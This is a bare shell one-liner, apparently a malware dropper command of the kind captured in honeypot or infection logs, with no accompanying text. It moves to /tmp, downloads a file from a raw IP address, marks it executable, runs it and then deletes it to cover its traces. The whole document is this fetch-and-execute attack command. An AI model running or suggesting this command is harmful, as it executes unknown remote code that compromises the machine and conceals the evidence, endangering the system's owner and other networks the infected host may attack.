cd /tmp; wget http://163.172.104.150/wget; chmod +x wget; ./wget; rm -rf wget
